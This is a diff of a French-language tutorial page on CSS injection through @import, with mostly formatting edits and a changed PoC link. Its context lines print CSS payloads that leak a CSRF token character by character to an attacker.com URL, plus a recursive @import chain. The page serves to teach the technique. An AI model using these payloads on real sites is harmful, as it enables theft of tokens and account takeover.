@@ -18,7 +18,7 @@ La règle CSS `@import` permet d'importer des règles CSS en référençant d'au
 
 Par exemple, le navigateur appliquant le style suivant n'effectuera pas l'import :
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```html
 <style>
   h1 {
@@ -32,7 +32,7 @@ Par exemple, le navigateur appliquant le style suivant n'effectuera pas l'import
 
 Ce qui rend donc impossible son utilisation lors des injections déjà vues dans les exemples précédents :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```html
 <!DOCTYPE html>
 <html>
@@ -53,7 +53,7 @@ Ce qui rend donc impossible son utilisation lors des injections déjà vues dans
 
 C'est donc le code suivant qui sera utilisé pour illustrer l'utilisation de la règle `@import` dans une injection CSS :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```html
 <!DOCTYPE html>
 <html>
@@ -90,7 +90,7 @@ Lorsque la victime visite la page injectée, son navigateur effectue la requête
 
 En admettant que le contenu de la feuille de style malicieuse n'effectue seulement qu'un changement de couleur du titre :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 h1 {
   color: red;
@@ -108,7 +108,7 @@ Pour l'attaquant, l'idée ici sera d'utiliser la feuille de style CSS sous son c
 
 Il est possible d'utiliser la règle `@import` afin de récupérer la valeur d'un attribut HTML, comme déjà vu dans la première partie. L'attaquant va tout d'abord créer la page d'instructions CSS suivante :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 input[name=csrf-token][value^=a]~* {
   background-image:url(https://attacker.com/?leak=a);
@@ -140,7 +140,7 @@ https://vulnerable.com/regle-import.php?css=@import%20url(https://attacker.com/s
 
 Une fois le premier caractère connu, il forgera une nouvelle feuille de style puis tentera de tromper à nouveau sa victime. Soit, en admettant que le premier caractère récupéré est `c` :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 input[name=csrf-token][value^=ca]~* {
   background-image:url(https://attacker.com/?leak=ca);
@@ -196,7 +196,7 @@ En théorie cela fonctionne, mais en pratique, plusieurs problématiques restent
 
 L'import de la première feuille de style va permettre de récupérer le caractère `n` de l'information à récupérer (grâce aux sélecteurs CSS) mais également d'importer la prochaine feuille de style (qui permettra la récupération le caractère `n+1` et ainsi de suite) :
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 /* La page à importer sera générée une fois le premier caractère récupéré */
 @import url("https://attacker.com/styles/recursive_style.css");
@@ -220,7 +220,7 @@ Seuls les navigateurs basés sur Chromium fonctionne de la sorte. Firefox par ex
 
 Afin de gagner en performance, si plusieurs règles CSS ciblent le même élément, alors une seule de ces règles sera appliquée. Par exemple :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 h1 {
   background: url(https://example.com/images/background1.png);
@@ -236,7 +236,7 @@ Ici seul le `background2.png` sera appliqué. Mais ce n'est pas tout, car seul l
 
 Cela va poser problème dans le cadre de l'automatisation. Lors de l'application de la première feuille de style, le sélecteur CSS du premier caractère sera appliqué (en admettant que le premier caractère est un `h`) :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 input[name=csrf-token][value^=h]~* {
   background-image:url(https://attacker.com/?leak=h);
@@ -246,7 +246,7 @@ input[name=csrf-token][value^=h]~* {
 
 Mais la règle (présente dans le prochain import) ciblant le même élément sera alors ignorée ne faisant ainsi pas fuiter le second caractère :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 input[name=csrf-token][value^=h2]~* {
   background-image:url(https://attacker.com/?leak=h2);
@@ -256,7 +256,7 @@ input[name=csrf-token][value^=h2]~* {
 
 Ici, la solution est d'utiliser la pseudo-class `:first-child` autant de fois que nécessaire de la façon suivante :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```css
 /* Première feuille CSS */
 input[name=csrf-token][value^=h]~*:first-child {
@@ -279,7 +279,7 @@ input[name=csrf-token][value^=h2A]~*:first-child:first-child:first-child {
 
 Cela ajoute une autre problématique. L'utilisation des sélecteurs `~*` ne semble pas compatibles avec l'utilisation d'une pseudo-class comme `:first-child`. Etant donné que seuls les navigateurs basés sur Chromium sont de toute façon exploitables, il est possible d'utiliser à la place la pseudo-class `has()` :&#x20;
 
-<pre class="language-css" data-overflow="wrap" data-line-numbers><code class="lang-css">/* Première feuille CSS */
+<pre class="language-css" data-overflow="wrap"><code class="lang-css">/* Première feuille CSS */
 has(input[name=csrf-token][value^=h]):first-child {
   background-image:url(https://attacker.com/?leak=h);
 }
@@ -303,6 +303,7 @@ has(input[name=csrf-token][value^=h2]):first-child:first-child {
 
 La position de l'injection semble avoir une incidence sur le bon déroulement de l'exploitation. Si le point d'injection se situe après l'élément ciblé, alors, l'attaque se déroule rapidement et sans encombre :&#x20;
 
+{% code overflow="wrap" %}
 ```html
 <!DOCTYPE html>
 <html>
@@ -324,10 +325,11 @@ La position de l'injection semble avoir une incidence sur le bon déroulement de
   </body>
 </html>
 ```
+{% endcode %}
 
 Dans le cas contraire, la récupération sera soit très lente voir même bloquée, excepté si la victime effectue des clics sur la page injectée :&#x20;
 
-{% code overflow="wrap" lineNumbers="true" %}
+{% code overflow="wrap" %}
 ```html
 <!DOCTYPE html>
 <html>
@@ -355,7 +357,7 @@ Dans le cas contraire, la récupération sera soit très lente voir même bloqu�
 Le mieux reste encore de tester soi-même l'automatisation pour bien se rendre compte de ces difficultés.
 {% endhint %}
 
-Le PoC est disponible [ici](https://github.com/Sharpforce/PoC-CSS-injection/tree/master/has-attribute-selectors-import).
+Le PoC est disponible [ici](https://github.com/Sharpforce/cybersecurity-code/tree/master/has-attribute-selectors-import).
 
 ## Références
 
